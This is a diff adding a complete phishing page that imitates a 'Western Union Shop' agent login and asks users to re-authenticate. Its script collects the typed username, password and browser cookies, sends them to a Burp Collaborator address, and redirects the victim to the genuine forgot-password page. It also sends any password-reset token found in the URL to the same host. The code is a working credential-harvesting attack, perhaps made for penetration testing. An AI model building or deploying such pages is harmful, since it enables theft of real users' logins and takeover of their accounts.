@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Western Union Shop - Login Required</title>
+    <style>
+      body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #f0f0f0;
+      }
+      .login-box {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        width: 300px;
+        text-align: center;
+      }
+      input {
+        width: 100%;
+        padding: 10px;
+        margin: 10px 0;
+        border: 1px solid #ccc;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+      button {
+        background: #007bff;
+        color: white;
+        padding: 10px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        width: 100%;
+      }
+      button:hover {
+        background: #0056b3;
+      }
+      p {
+        font-size: 14px;
+        color: #333;
+      }
+      .note {
+        font-size: 12px;
+        color: #666;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-box">
+      <h2>Western Union Shop</h2>
+      <p>Please re-authenticate to reset your password.</p>
+      <input type="text" id="username" placeholder="Username or Email" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="captureCredentials()">Login</button>
+      <p class="note">
+        This application is intended for Western Union approved agents only.
+        Contact
+        <a href="mailto:helpdesk@westernunionshop.com"
+          >helpdesk@westernunionshop.com</a
+        >
+        for issues.
+      </p>
+    </div>
+
+    <script>
+      function captureCredentials() {
+        const username = document.getElementById("username").value;
+        const password = document.getElementById("password").value;
+        const cookies = document.cookie || "none";
+        const data = `username=${encodeURIComponent(
+          username
+        )}&password=${encodeURIComponent(
+          password
+        )}&cookies=${encodeURIComponent(cookies)}`;
+
+        // Exfiltrate to Burp Collaborator (replace with your URL)
+        const collaboratorUrl =
+          "https://uecyg4lfagvid3e9p3r80cf39ufk39.oastify.com"; // Replace with your Burp Collaborator URL
+        fetch(collaboratorUrl + "?" + data, { mode: "no-cors" }).catch(
+          () => {}
+        );
+
+        // Redirect to Western Union Shop forgot password page
+        window.location = "https://www.westernunionshop.com/forgotpw.php";
+      }
+
+      // Capture reset token from URL (if present)
+      const urlParams = new URLSearchParams(window.location.search);
+      const resetToken = urlParams.get("token") || "none";
+      if (resetToken !== "none") {
+        fetch(
+          "https://uecyg4lfagvid3e9p3r80cf39ufk39.oastify.com?token=" +
+            encodeURIComponent(resetToken),
+          { mode: "no-cors" }
+        ).catch(() => {});
+      }
+    </script>
+  </body>
+</html>
